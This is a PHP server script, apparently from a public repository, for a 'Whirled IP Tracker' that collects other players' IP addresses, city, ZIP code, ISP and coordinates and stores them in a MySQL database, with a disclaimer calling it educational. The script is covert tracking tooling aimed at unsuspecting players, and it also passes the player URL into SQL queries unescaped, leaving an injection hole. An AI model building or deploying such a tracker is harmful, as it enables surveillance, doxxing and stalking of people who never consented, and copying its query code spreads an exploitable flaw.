<?php
	/* 
	Programmed by Shadowsych.
	GitHub: https://www.github.com/Shadowsych

	This is an IP Tracker that receives the IP Address of players
	within a Whirled room and sends it to a database running under a
	web-server.

	DISCLAIMER:
	THIS PROGRAM IS USED FOR SECURITY/EDUCATIONAL PURPOSES AND SHOULD NOT
	BE UTILIZED FOR MALICIOUS REASONS. ALL LIABILITIES ARE TO THE USER OF
	THIS PROGRAM, AND NOT TO THE OWNER.
	*/
	
	include_once("dbconnection.php");
	
	//make sure either POST variables are not blank
	if(!isset($_POST["playerId"]) || !isset($_POST["playerName"])) {
		header("Location: " . 'http://google.com');
		die();
	}
	
	//get player variables from the client
	$playerId = mysqli_real_escape_string($link, $_POST["playerId"]);
	$playerName = mysqli_real_escape_string($link, $_POST["playerName"]);
	$playerURL = $_POST["playerURL"];
	$playerHost = parse_url($playerURL, PHP_URL_HOST);
	$playerURL = $playerHost . "/#people-" . $playerId;
	
	//json variables
	$playerInfo = json_decode($_POST["playerInfo"], true);
	$city = mysqli_real_escape_string($link, $playerInfo["city"]);
	$state = mysqli_real_escape_string($link,$playerInfo["regionName"]);
	$country = mysqli_real_escape_string($link,$playerInfo["country"]);
	$isp = mysqli_real_escape_string($link,$playerInfo["isp"]);
	$latitude = mysqli_real_escape_string($link,$playerInfo["lat"]);
	$longitude = mysqli_real_escape_string($link,$playerInfo["lon"]);
	$ipaddress = mysqli_real_escape_string($link,$playerInfo["query"]);
	$timezone = mysqli_real_escape_string($link,$playerInfo["timezone"]);
	$zipcode = mysqli_real_escape_string($link,$playerInfo["zip"]);
	
	//sometimes the player doesn't have certain variables, so create default values for such
	if($city === "") {
		$city = "Unknown";
	}
	if($state === "") {
		$state = "Unknown";
	}
	if($country === "") {
		$country = "Unknown";
	}
	if($isp === "") {
		$isp = "Unknown";
	}
	if($latitude === "") {
		$latitude = "Unknown";
	}
	if($longitude === "") {
		$longitude = "Unknown";
	}
	if($ipaddress === "") {
		$ipaddress = "Unknown";
	}
	if($timezone === "") {
		$timezone = "Unknown";
	}
	if($zipcode === "") {
		$zipcode = "Unknown";
	}
	
	//check if this ip address exists for the player id and URL
	$query = "SELECT * FROM player WHERE ipaddress='$ipaddress' AND playerurl='$playerURL' LIMIT 1";
	$result = mysqli_query($link, $query);
	if(mysqli_num_rows($result)) {
		//update the profile's name (in case the player changed it)
		$query = "UPDATE player SET playername='$playerName' WHERE ipaddress='$ipaddress' AND playerurl='$playerURL'";
		mysqli_query($link, $query);
		header("Location: " . 'http://' . $playerHost);
		die();
	}
	
	//store player information into the database
	$query = "INSERT INTO player (`playerid`, `playerurl`, `playername`, `ipaddress`, `city`, `state`, `country`, `zipcode`, `timezone`, `latitude`, `longitude`, `isp`) VALUES('$playerId', '$playerURL', '$playerName', '$ipaddress', '$city', '$state', '$country', '$zipcode', '$timezone', '$latitude', '$longitude', '$isp')";
	if(mysqli_query($link, $query)) {
	} else {
		echo("Error connecting to the Whirled IP Tracker database: " . mysqli_error($link));
	}
	
	//redirect to original page
	header("Location: " . 'http://' . $playerHost);
	die();
?>
